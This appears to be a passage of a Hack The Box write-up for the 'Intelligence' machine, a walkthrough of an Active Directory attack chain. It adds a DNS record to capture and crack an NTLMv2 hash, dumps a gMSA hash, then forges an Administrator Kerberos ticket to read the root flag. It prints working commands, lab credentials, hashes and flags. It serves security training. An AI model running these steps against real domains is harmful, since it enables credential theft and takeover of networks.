	fr--r--r--                3 Sun Dec 31 23:58:45 1600	epmapper
	fr--r--r--                1 Sun Dec 31 23:58:45 1600	Winsock2\CatalogChangeListener-1b8-0
	fr--r--r--                3 Sun Dec 31 23:58:45 1600	LSM_API_service
	fr--r--r--                3 Sun Dec 31 23:58:45 1600	eventlog
	fr--r--r--                1 Sun Dec 31 23:58:45 1600	Winsock2\CatalogChangeListener-394-0
	fr--r--r--                3 Sun Dec 31 23:58:45 1600	atsvc
	fr--r--r--                4 Sun Dec 31 23:58:45 1600	wkssvc
	fr--r--r--                1 Sun Dec 31 23:58:45 1600	Winsock2\CatalogChangeListener-258-0
	fr--r--r--                1 Sun Dec 31 23:58:45 1600	Winsock2\CatalogChangeListener-4e8-0
	fr--r--r--                1 Sun Dec 31 23:58:45 1600	Winsock2\CatalogChangeListener-258-1
	fr--r--r--                3 Sun Dec 31 23:58:45 1600	RpcProxy\49677
	fr--r--r--                3 Sun Dec 31 23:58:45 1600	01c597a227e270af
	fr--r--r--                3 Sun Dec 31 23:58:45 1600	RpcProxy\593
	fr--r--r--                5 Sun Dec 31 23:58:45 1600	srvsvc
	fr--r--r--                3 Sun Dec 31 23:58:45 1600	efsrpc
	fr--r--r--                3 Sun Dec 31 23:58:45 1600	netdfs
	fr--r--r--                1 Sun Dec 31 23:58:45 1600	vgauth-service
	fr--r--r--                1 Sun Dec 31 23:58:45 1600	Winsock2\CatalogChangeListener-240-0
	fr--r--r--                3 Sun Dec 31 23:58:45 1600	W32TIME_ALT
	fr--r--r--                3 Sun Dec 31 23:58:45 1600	cert
	fr--r--r--                1 Sun Dec 31 23:58:45 1600	Winsock2\CatalogChangeListener-9f0-0
	fr--r--r--                1 Sun Dec 31 23:58:45 1600	Winsock2\CatalogChangeListener-a7c-0
	fr--r--r--                1 Sun Dec 31 23:58:45 1600	PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER
	fr--r--r--                1 Sun Dec 31 23:58:45 1600	Winsock2\CatalogChangeListener-a50-0
	IT                                                	READ ONLY	
	.\IT\*
	dr--r--r--                0 Mon Apr 19 01:50:58 2021	.
	dr--r--r--                0 Mon Apr 19 01:50:58 2021	..
	fr--r--r--             1046 Mon Apr 19 01:50:58 2021	downdetector.ps1
	NETLOGON                                          	READ ONLY	Logon server share 
	.\NETLOGON\*
	dr--r--r--                0 Mon Apr 19 01:42:14 2021	.
	dr--r--r--                0 Mon Apr 19 01:42:14 2021	..
	SYSVOL                                            	READ ONLY	Logon server share 
	.\SYSVOL\*
	dr--r--r--                0 Mon Apr 19 01:42:14 2021	.
	dr--r--r--                0 Mon Apr 19 01:42:14 2021	..
	dr--r--r--                0 Mon Apr 19 01:42:14 2021	intelligence.htb
	Users                                             	READ ONLY	
	.\Users\*
	dw--w--w--                0 Mon Apr 19 02:20:26 2021	.
	dw--w--w--                0 Mon Apr 19 02:20:26 2021	..
	dr--r--r--                0 Mon Apr 19 01:18:39 2021	Administrator
	dr--r--r--                0 Mon Apr 19 04:16:30 2021	All Users
	dw--w--w--                0 Mon Apr 19 03:17:40 2021	Default
	dr--r--r--                0 Mon Apr 19 04:16:30 2021	Default User
	fr--r--r--              174 Mon Apr 19 04:15:17 2021	desktop.ini
	dw--w--w--                0 Mon Apr 19 01:18:39 2021	Public
	dr--r--r--                0 Mon Apr 19 02:20:26 2021	Ted.Graves
	dr--r--r--                0 Mon Apr 19 01:51:46 2021	Tiffany.Molina
```
We have access to few of the shares so let's try and access those.
## User.txt
```bash
kali@kali:~/HackTheBox/Intelligence$ smbclient  //intelligence.htb/Users -U 'Tiffany.Molina'
Enter WORKGROUP\Tiffany.Molina's password: 
Try "help" to get a list of possible commands.
smb: \> cd Tiffany.Molina\Desktop\
smb: \Tiffany.Molina\Desktop\> get user.txt 
getting file \Tiffany.Molina\Desktop\user.txt of size 34 as user.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
```
Now you have user.txt
# PrivESC
## Enumeration
The share that looked intresting to me was IT, so let's look into that.
```bash
kali@kali:~/HackTheBox/Intelligence$ smbclient  //intelligence.htb/IT -U 'Tiffany.Molina'
Enter WORKGROUP\Tiffany.Molina's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Apr 19 01:50:55 2021
  ..                                  D        0  Mon Apr 19 01:50:55 2021
  downdetector.ps1                    A     1046  Mon Apr 19 01:50:55 2021

                3770367 blocks of size 4096. 1454216 blocks available
smb: \> get downdetector.ps1 
getting file \downdetector.ps1 of size 1046 as downdetector.ps1 (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
smb: \> 
```
Looks like we have a powershell script let's explore it.
```powershell
# Check web server status. Scheduled to run every 5min
Import-Module ActiveDirectory 
foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
try {
$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
if(.StatusCode -ne 200) {
Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
}
} catch {}
}
```
Looks like we have the cronjob kind of thing running every five minutes we can see that it makes a request to webserver if we can bypass the check for validation which will be pretty easy as it uses web* as validation so not much problem there.
Now so I think that if we can add a dns in the record we can get the Ted.Graves hash using responder.
Basically the login behind this is simple we add the dns record and then the Ted will see if that record responds back or not and as soon as Ted checks that record we will get his hash in responder.
```bash
kali@kali:~/HackTheBox/Intelligence$ sudo python /usr/share/responder/Responder.py -I tun0 -A                                                                         
                                         __                                                                                                                           
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.                                                                                                              
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|                                                                                                              
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|                                                                                                                
                   |__|                                                                                                                                               
 
           NBT-NS, LLMNR & MDNS Responder 3.0.2.0                 
  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C 
/!\ Warning: files/AccessDenied.html: file not found
/!\ Warning: files/BindShell.exe: file not found                                                                                                                      
 
[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]
	
[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
	POP3 server                [ON] 
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [ON]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Fingerprint hosts          [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.14]
    Challenge set              [1122334455667788]
    Don't Respond To Names     ['ISATAP']



[i] Responder is in analyze mode. No NBT-NS, LLMNR, MDNS requests will be poisoned.
[Analyze mode: ICMP] You can ICMP Redirect on this network.
[Analyze mode: ICMP] This workstation (10.10.14.14) is not on the same subnet than the DNS server (<--SNIP--->).
[Analyze mode: ICMP] Use `python tools/Icmp-Redirect.py` for more details.
[Analyze mode: ICMP] You can ICMP Redirect on this network.
[Analyze mode: ICMP] This workstation (10.10.14.14) is not on the same subnet than the DNS server (<---SNIP---->).
[Analyze mode: ICMP] Use `python tools/Icmp-Redirect.py` for more details.
[+] Listening for events..
```
Now let's try and use dnstool to deal with DNS records.
you can find the dnstool over here.
https://github.com/dirkjanm/krbrelayx.git
You can install it like below.
```bash
kali@kali:~/HackTheBox/Intelligence$ git clone https://github.com/dirkjanm/krbrelayx.git
Cloning into 'krbrelayx'...
remote: Enumerating objects: 98, done.
remote: Total 98 (delta 0), reused 0 (delta 0), pack-reused 98
Unpacking objects: 100% (98/98), 65.74 KiB | 474.00 KiB/s, done.
kali@kali:~/HackTheBox/Intelligence$ cd krbrelayx/
kali@kali:~/HackTheBox/Intelligence/krbrelayx$ ls
addspn.py  dnstool.py  krbrelayx.py  lib  LICENSE  printerbug.py  README.md
kali@kali:~/HackTheBox/Intelligence/krbrelayx$ python3 dnstool.py -u 'intelligence.htb\Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' -a add -r 'weboops.intelligence.htb' -d <YOUR IP> <MACHINE IP>
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
/home/kali/HackTheBox/Intelligence/krbrelayx/dnstool.py:241: DeprecationWarning: please use dns.resolver.Resolver.resolve() instead
  res = dnsresolver.query(zone, 'SOA')
[-] Adding new record
[+] LDAP operation completed successfully
kali@kali:~/HackTheBox/Intelligence/krbrelayx$
```
Now we our record in DNS so let's wait for hash in responder.
Note this may take up to 5 mins so be patient.
```bash
[+] Listening for events...
[HTTP] NTLMv2 Client   : <MACHINE IP>
[HTTP] NTLMv2 Username : intelligence\Ted.Graves
[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:1122334455667788:C8B5809269803AA43B885BE5C452F7CC:0101000000000000753D23B43271D701F88971DBE2AC9A9D000000000200060053004D0042000100160053004D0042002D0054004F004F004C004B00490054000400120073006D0062002E006C006F00630061006C000300280073006500720076006500720032003000300033002E0073006D0062002E006C006F00630061006C000500120073006D0062002E006C006F00630061006C0008003000300000000000000000000000002000005390A83A090299C14BEA2A5D14212C5258BF7161A4DB11E0F11AAEC4B7116CC80A0010000000000000000000000000000000000009003A0048005400540050002F007700650062006F006F00700073002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000
```
Now we have the hash for Ted.Graves let's try and crack it.
Over here I have used john you can also use hashcat for the same and there are also online cracker if you prefer that.
```bash
kali@kali:~/HackTheBox/Intelligence/krbrelayx$ sudo john hash --wordlist=/usr/share/wordlists/rockyou.txt
[sudo] password for kali: 
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Mr.Teddy         (Ted.Graves)
1g 0:00:00:23 DONE (2021-07-04 18:17) 0.04170g/s 450978p/s 450978c/s 450978C/s Mrz.deltasigma..Mr BOB
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed
```
Now we have the password for Ted.Graves
So let's enumerate the ldap as we already know we don't have much on share.
I got this tool from the link https://github.com/micahvandeusen/gMSADumper
```bash
kali@kali:~/HackTheBox/Intelligence/gMSADumper$ python3 gMSADumper.py -u 'Ted.Graves' -p 'Mr.Teddy' -d 'intelligence.htb' -l 'dc.intelligence.htb'
svc_int$:::d64b83fe606e6d3005e20ce0ee932fe2
```
we have a hash but unfortunately it's not in rockyou.txt
```bash
kali@kali:~/HackTheBox/Intelligence/gMSADumper$ sudo john new --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 128/128 SSE2 4x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:04 DONE (2021-07-04 18:30) 0g/s 3431Kp/s 3431Kc/s 3431KC/s      markinho..*7¡Vamos!
Session completed
```
So now the other option is to get the kerberos ticket using that hash.
Famously or INFamously known as silver ticket attack on AD.
So you can search Silver Ticket attack on Active Directory to learn more.
Let's try that.
```bash
kali@kali:~/HackTheBox/Intelligence/newLdapDump$ getST.py intelligence.htb/svc_int$ -spn WWW/dc.intelligence.htb -hashes :d64b83fe606e6d3005e20ce0ee932fe2 -impersonate Administrator
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Getting TGT for user
Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```
It gives me error for the clock skew which is normal if you are familiar with Active Directory you just have to sync time between the server and machine.

run the command:

```bash
sudo ntpdate <MACHINE IP>
```
Now the clock skew has been fixed let's try silver ticket attack again.
If the time doesn't change try the following
```bash
sudo net time set -S <MACHINE IP>
```
And now run the command
```bash
kali@kali:~/HackTheBox/Intelligence$ python3 /usr/share/doc/python3-impacket/examples/getST.py intelligence.htb/svc_int$ -spn WWW/dc.intelligence.htb -hashes :d64b83fe606e6d3005e20ce0ee932fe2 -impersonate Administrator
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Getting TGT for user
[*] Impersonating Administrator
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache
```
Now let's use that ticket to authenticate.
```bash
kali@kali:~/HackTheBox/Intelligence$ export KRB5CCNAME=Administrator.ccache
````

````bash
kali@kali:~/HackTheBox/Intelligence$ python3 /usr/share/doc/python3-impacket/examples/atexec.py -k -no-pass dc.intelligence.htb 'type C:\Users\Administrator\Desktop\root.txt'
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[!] This will work ONLY on Windows >= Vista
[*] Creating task \QwtOoPCQ
[*] Running task \QwtOoPCQ
[*] Deleting task \QwtOoPCQ
[*] Attempting to read ADMIN$\Temp\QwtOoPCQ.tmp
b247bb93174b98bfa7ae9323716ae8f5
````

So now we root so let's get all the flags.

## If you like the writeup give rep+
Profie Link: [<img src="http://www.hackthebox.eu/badge/image/387509" alt="Hack The Box"/>](https://app.hackthebox.eu/profile/387509)

